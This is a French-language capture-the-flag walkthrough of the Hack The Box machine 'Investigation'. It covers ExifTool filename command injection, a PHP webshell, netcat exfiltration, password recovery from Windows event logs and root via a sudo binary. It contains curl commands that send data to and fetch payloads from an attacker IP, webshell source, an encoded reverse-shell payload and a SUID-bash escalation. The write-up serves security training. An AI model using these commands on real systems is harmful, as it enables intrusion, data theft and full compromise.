\chapter{Investigation}
\begin{itemize}
    \item {\bf technics}: windows event log, exiftool vuln,  
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
TARGET_IP=
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP

ORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA)
|   256 274520add2faa73a8373d97c79abf30b (ECDSA)
|_  256 4245eb916e21020617b2748bc5834fe0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://eforenzics.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

\end{verbatim}


\subsection{http}
\begin{verbatim}
 ffuf -u http://eforenzics.htb/ -H 'Host: FUZZ.eforenzics.htb' \
    -w utils/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt \
    -fw 20 - o host2.json 


alpblog                [Status: 200, Size: 10957, Words: 3937, Lines: 209, Duration: 29ms]
\end{verbatim}


\subsection{http alpblog.eforenzics.htb}

semble avoir que du \verb+301+
\begin{verbatim}
$ curl -I http://alpblog.eforenzics.htb
HTTP/1.1 301 Moved Permanently
Date: Wed, 25 Jan 2023 00:43:26 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://eforenzics.htb/
Content-Length: 318
Content-Type: text/html; charset=iso-8859-1

\end{verbatim}

\begin{verbatim}
$ ~/pentesting-tools/web/httpmethods/httpmethods.py http://alpblog.eforenzics.htb
  BAMBOOZLE         318      301           Moved Permanently
  CHECKIN           318      301           Moved Permanently
  CHECKOUT          318      301           Moved Permanently
  CONNECT           306      400           Bad Request
  COPY              318      301           Moved Permanently
...SNIP...  
  UNLOCK            318      301           Moved Permanently
  VERSION-CONTROL   318      301           Moved Permanently
\end{verbatim}

\subsection{http eforenzics.htb}

file upload:
retourne un exiftool (version 12.37) sur l'image

\verb+http://eforenzics.htb/analysed_images/background1jpg.txt+

le nom du fichier de sortie = nom fichier d'entrée moins le \verb+.+ +
\verb+.txt+

3 users
\begin{verbatim}
Olivia Rae
Ethan James
Charlotte Louise
\end{verbatim}

les ffuf ne donnent pas grand chose a priori. 
semble a peu près tout donc il va falloir se concentrer sur upload.


il existe bien une vuln mais semble corrigée à partir de 12.24

\begin{verbatim}
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > show options

Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.jpg          yes       Output file


Payload options (cmd/unix/python/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.16.26      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   JPEG file


$ file msf.jpg
msf.jpg: JPEG image data, Exif standard: [TIFF image data, big-endian, direntries=5], baseline, precision 8, 8x8, components 3
\end{verbatim}

on ne recoit rien
\begin{verbatim}
ExifTool Version Number         : 12.37
File Name                       : msf.jpg
Directory                       : .
File Size                       : 2.5 KiB
File Modification Date/Time     : 2023:01:25 01:12:41+00:00
File Access Date/Time           : 2023:01:25 01:12:41+00:00
File Inode Change Date/Time     : 2023:01:25 01:12:41+00:00
File Permissions                : -rw-r--r--
File Type                       : JPEG (multi-page)
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Subfile Type                    : Single-page image
DjVu Version                    : 0.24
Spatial Resolution              : 100
Gamma                           : 2.2
Orientation                     : Unknown (0)
Included File ID                : shared_anno.iff
Author                          : \c@{[`perl -e 'system(pack(qq,H980,,qq,6563686f20657865635c285f5f696d706f72745f5f5c285c277a6c69625c275c292e6465636f6d70726573735c285f5f696d706f72745f5f5c285c276261736536345c275c292e6236346465636f64655c285f5f696d706f72745f5f5c285c27636f646563735c275c292e676574656e636f6465725c285c277574662d385c275c295c285c27654e704e6a734671416a455168732f4a552b526d676b7459525477494f556a5a67705257715875584e5a6c69634a75456d577a372b6b31304478336d3873332f4d54502b4f30584d67714b395178594443654a2b486b3358684e45435552306a70326849507a314a657639364f587830665550366648783575357a377a32372f726f716b62517742624a5a7973577031376131656278664e707052532f50666d527841395472446a7a4a6e6949396766755772584738575a2f78496a424f6d554d57334a3252566875484f57444f7054544456703641626a614f714368724c7a6f5561485531636854766b6641654a4d5a58453053542b4e636d397755693066584a795a4f5375764541516e6f2b4a2f7734705738675c3d5c3d5c275c295c5b305c5d5c295c295c29207c2065786563202428776869636820707974686f6e207c7c20776869636820707974686f6e33207c7c20776869636820707974686f6e3229202d,))'`]}
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Image Width                     : 8
Image Height                    : 8
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 8x8
Megapixels                      : 0.000064
\end{verbatim}

en cherchant un peu plus 

\href{https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429}{Command
Injection in Exiftool before 12.38}

\begin{verbatim}
Overview

Exiftool versions < 12.38 are vulnerable to Command Injection through a crafted
filename. If the filename passed to exiftool ends with a pipe character | and
exists on the filesystem, then the file will be treated as a pipe and executed
as an OS command.a
\end{verbatim}

\begin{verbatim}
$ cp /background1.jpg ping\ -c\ 3\ 10.10.16.26\ \|
\end{verbatim}

\begin{verbatim}
 sudo tcpdump -xvi tun0 icmp 
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
02:45:58.160128 IP (tos 0x0, ttl 63, id 44048, offset 0, flags [DF], proto ICMP (1), length 84)
    eforenzics.htb > honbu: ICMP echo request, id 7, seq 1, length 64
	0x0000:  4500 0054 ac10 4000 3f01 7e3b 0a81 ecb8
...SNIP...
\end{verbatim}

ok maintenant un webshell php.

le soucis c'est qu'un nom de fichier ne peut pas contenir de /

l'idée serait de passer par la commande
\begin{verbatim}
<base64 encoded command>|base64 -d|sh |
\end{verbatim}

d'abord on commence par leak un peu de data pour travailler

\begin{verbatim}
$ cp msf.jpg "echo $(echo 'curl  10.10.16.26/$(pwd|base64)' |base64) |base64 -d |sh |"
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.236.184 - - [25/Jan/2023 03:26:35] "GET /L3Zhci93d3cvdXBsb2Fkcy8xNjc0NjEzNTk0Cg== HTTP/1.1" 404 -
$ echo L3Zhci93d3cvdXBsb2Fkcy8xNjc0NjEzNTk0Cg== |base64 -d
/var/www/uploads/1674613594

$ cp msf.jpg "echo $(echo 'curl  10.10.16.26/$(ls /var/www|base64)' |base64) |base64 -d |sh |"
$ echo aHRtbAp1cGxvYWRzCg== | base64 -d
html
uploads


$ cat test.php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
\end{verbatim}

obligé de passer par 1 la copie sur \verb+/tmp+ puis 2 la copie vers
\verb+/var/www/html/analysed_images/test.php+ car sinon ca fait un truc bizare
sur le base64 si on fait un un curl direct.
\begin{verbatim}
$ cp msf.jpg "echo $(echo 'curl  10.10.16.26/test.php -o /tmp/test.php' |base64) |base64 -d |sh |"
$ cp msf.jpg "echo $(echo 'cp /tmp/test.php /var/www/html/analysed_images/test.php' |base64) |base64 -d |sh |"


$ curl -i http://eforenzics.htb/analysed_images/test.php?cmd=id
$ curl  http://eforenzics.htb/analysed_images/test.php?cmd=id
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
\end{verbatim}

on peut passer à un webshell plus costaud
\href{https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php}{wwwolf-php-webshell}


on peut donc s'ouvrir un revershell que l'on upgrade avec
\begin{verbatim}
python3 -c 'import pty; pty.spawn("/bin/bash")'
\end{verbatim}

\begin{verbatim}
www-data@investigation:~/html/analysed_images$ curl 10.10.16.26/linpeas.sh -o linpeas.sh
<d_images$ curl 10.10.16.26/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  808k  100  808k    0     0  1667k      0 --:--:-- --:--:-- --:--:-- 1667k
www-data@investigation:~/html/analysed_images$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@investigation:~/html/analysed_images$ ./linpeas.sh -q
...SNIP...

*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*
...SNIP...
 Interesting GROUP writable files (not in Home) (max 500)
  Group www-data:
/usr/local/investigation/analysed_log


\end{verbatim}

chose etrange le fichier est vide et les fichiers ne sont pas détruit.
\begin{verbatim}
$ ls -l /usr/local/investigation
-rw-rw-r-- 1 smorton  smorton  1308160 Oct  1 00:35 'Windows Event Logs for Analysis.msg'
-rw-rw-r-- 1 www-data www-data       0 Oct  1 00:40  analysed_log
$ file 'Windows Event Logs for Analysis.msg'
Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message
\end{verbatim}

donc on l'exfiltre

\begin{verbatim}
$ nc -lnvp 4445 > logs.msg
Listening on 0.0.0.0 4445
Connection received on 10.129.236.184 50360

www-data@investigation:/usr/local/investigation$ nc -nv 10.10.16.26 4445 < 'Windows Event Logs for Analysis.msg'
Connection to 10.10.16.26 4445 port [tcp/*] succeeded!
\end{verbatim}

en passant par un online converter
(\url{https://www.coolutils.com/online/Mail-Converter/}) on a :
\begin{verbatim}
   From: "Thomas Jones" <thomas.jones@eforenzics.htb>
     To: "Steve Morton" <steve.morton@eforenzics.htb>
   Date: 1/15/2022 4:30:29 PM
Subject: Windows Event Logs for Analysis
Attachments: evtx-logs.zip (1,246.67 KB)
-----------------------------------------------------
Hi Steve,

Can you look through these logs to see if our analysts have been logging on to
the inspection terminal. I'm concerned that they are moving data on to
production without following our data transfer procedures.

Regards.
Tom
\end{verbatim}

donc il faut extraire la pièce jointe.
\url{https://www.encryptomatic.com/viewer/}

\begin{verbatim}
$ file security.evtx
security.evtx: MS Windows 10-11 Event Log, version  3.2, 238 chunks (no. 237 in use), next record no. 20013
\end{verbatim}


\url{https://github.com/omerbenamram/evtx}

\begin{verbatim}
 $ ./evtx_dump -o json ./security.evtx |grep '^Record' |wc -l
20012
\end{verbatim}

ca ne va pas le faire à lire.

\begin{verbatim}
$ for i in $(./evtx_dump -o json ./security.evtx |grep '"EventID"' |sort | uniq | cut -d':' -f 2 | sed 's/,//') ; do echo $i  $(./evtx_dump -o json ./security.evtx  | grep "$i," |wc -l)  ; done
1102 3
4611 48
4624 93
4625 5
...SNIP...  
5447 202
5450 10
6416 30
\end{verbatim}

\url{https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/}

\url{https://petri.com/monitoring-windows-event-logs-for-security-breaches/}

après pas mal de recherche les event de tyoe 
\verb+4625  	An account failed to log on+ sont interessant

\begin{verbatim}
 cat security.json |grep -A 27 -B37 '"EventID": 4625,' | grep "TargetUserName"
      "TargetUserName": "lmonroe",
      "TargetUserName": "hmraley",
      "TargetUserName": "Def@ultf0r3nz!csPa$$",
\end{verbatim}

ca ressemble a quelqu'un qui saisi son passwd au lieu du login

password reuse:
\begin{verbatim}
smorton:x:1000:1000:eForenzics:/home/smorton:/bin/bash
\end{verbatim}

yes

\begin{verbatim}
$ ssh smorton@10.129.236.184
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary


\end{verbatim}

malgré les test on obtient tout le temps
\begin{verbatim}
$ sudo /usr/bin/binary pspy64 
Exiting...
\end{verbatim}


donc exfiltre + ghidra

\begin{verbatim}
undefined8 main(int param_1,long param_2)

{
  __uid_t _Var1;
  int iVar2;
  FILE *__stream;
  undefined8 uVar3;
  char *__s;
  char *__s_00;
  
  if (param_1 != 3) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  _Var1 = getuid();
  if (_Var1 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(*(char **)(param_2 + 0x10),"lDnxUysaQn");
  if (iVar2 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Running... ");
  __stream = fopen(*(char **)(param_2 + 0x10),"wb");
  uVar3 = curl_easy_init();
  curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
  curl_easy_setopt(uVar3,0x2711,__stream);
  curl_easy_setopt(uVar3,0x2d,1);
  iVar2 = curl_easy_perform(uVar3);
  if (iVar2 == 0) {
    iVar2 = snprintf((char *)0x0,0,"%s",*(undefined8 *)(param_2 + 0x10));
    __s = (char *)malloc((long)iVar2 + 1);
    snprintf(__s,(long)iVar2 + 1,"%s",*(undefined8 *)(param_2 + 0x10));
    iVar2 = snprintf((char *)0x0,0,"perl ./%s",__s);
    __s_00 = (char *)malloc((long)iVar2 + 1);
    snprintf(__s_00,(long)iVar2 + 1,"perl ./%s",__s);
    fclose(__stream);
    curl_easy_cleanup(uVar3);
    setuid(0);
    system(__s_00);
    system("rm -f ./lDnxUysaQn");
    return 0;
  }
  puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
  exit(0);
}

\end{verbatim}


\begin{verbatim}
curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
CURL_OPT_URL = 10002.
CURLOPT_WRITEDATA = 10001
\end{verbatim}

\begin{verbatim}
$ sudo /usr/bin/binary http://10.10.16.26/linpeas.sh lDnxUysaQn
\end{verbatim}
ca exec linpeas en root ?


\begin{verbatim}
$ cat test.sh
#!/bin/sh

chmod +s /usr/bin/bash

morton@investigation:~$ sudo /usr/bin/binary http://10.10.16.26/test.sh lDnxUysaQn
Running...
smorton@investigation:~$ ls -l /usr/bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /usr/bin/bash
\end{verbatim}

cqfd
